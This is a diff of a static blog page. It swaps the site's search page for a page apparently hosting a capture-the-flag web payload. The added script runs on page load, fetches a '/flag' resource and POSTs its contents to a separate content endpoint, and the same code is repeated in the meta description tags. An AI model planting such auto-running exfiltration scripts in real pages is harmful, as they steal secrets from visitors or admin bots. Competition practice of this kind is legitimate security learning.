@@ -6,13 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="website">
-<meta property="og:title" content="search">
-<meta property="og:url" content="https://kc1zs4.github.io/search/index.html">
+    <meta name="description" content="let url &#x3D; &quot;...&quot;;   fetch(url + &quot;&#x2F;flag&quot;)     .then((res) &#x3D;&gt; res.text())     .then((res) &#x3D;&gt; {       fetch(url + &quot;&#x2F;content&#x2F;613cdda82446ae4b717db0853d7f6e16&quot;, {         method: &quot;POST&quot;,         headers:">
+<meta property="og:type" content="website">
+<meta property="og:title" content="KC1zs4&#39;s Blog">
+<meta property="og:url" content="https://kc1zs4.github.io/script/web02_js_wangding24.html">
 <meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="let url &#x3D; &quot;...&quot;;   fetch(url + &quot;&#x2F;flag&quot;)     .then((res) &#x3D;&gt; res.text())     .then((res) &#x3D;&gt; {       fetch(url + &quot;&#x2F;content&#x2F;613cdda82446ae4b717db0853d7f6e16&quot;, {         method: &quot;POST&quot;,         headers:">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-10-11T12:16:29.000Z">
-<meta property="article:modified_time" content="2024-10-29T15:39:12.694Z">
+<meta property="article:published_time" content="2024-10-29T15:52:20.593Z">
+<meta property="article:modified_time" content="2024-10-29T15:49:58.722Z">
 <meta name="twitter:card" content="summary">
     
     
@@ -33,7 +35,7 @@
       
     
     <!-- title -->
-    <title>search</title>
+    <title>KC1zs4&#39;s Blog</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -97,15 +99,22 @@
 
   <div class="content" itemprop="articleBody">
       
-        <section id="search">
-  <form>
-    <input type="text" class="search-input" id="search-input" placeholder="Search...">
-  </form>
-  <div id="search-result"></div>
-  <p class="search-no-result">No results found.</p>
-</section>
+          <script>
+  let url = "...";
+  fetch(url + "/flag")
+    .then((res) => res.text())
+    .then((res) => {
+      fetch(url + "/content/613cdda82446ae4b717db0853d7f6e16", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "<h1>kc1zs4</h1>" + res,
+      }).then((res) => {});
+    });
+</script>
 
-      
+        
   </div>
 </article>
 
@@ -160,45 +169,6 @@
 <script src="/js/main.js"></script>
 
 <!-- search -->
-
-  
-<script src="/js/search.js"></script>
-
-  <script type="text/javascript">
-  $(function() {
-
-    var $inputArea = $("input#search-input");
-    var $resultArea = document.querySelector("div#search-result");
-
-    $inputArea.focus(function() {
-      var search_path = "search.xml";
-      if (search_path.length == 0) {
-        search_path = "search.xml";
-      }
-      var path = "/" + search_path;
-      searchFunc(path, 'search-input', 'search-result');
-    });
-
-    $inputArea.keydown(function(e) {
-      if (e.which == 13) {
-        e.preventDefault();
-      }
-    });
-
-    var observer = new MutationObserver(function(mutationsList, observer) {
-      if (mutationsList.length == 1) {
-        if (mutationsList[0].addedNodes.length) {
-          $(".search-no-result").hide();
-        } else if (mutationsList[0].removedNodes.length) {
-          $(".search-no-result").show(200);
-        }
-      }
-    });
-
-    observer.observe($resultArea, { childList: true });
-
-  });
-  </script>
 
 <!-- Baidu Analytics -->
 
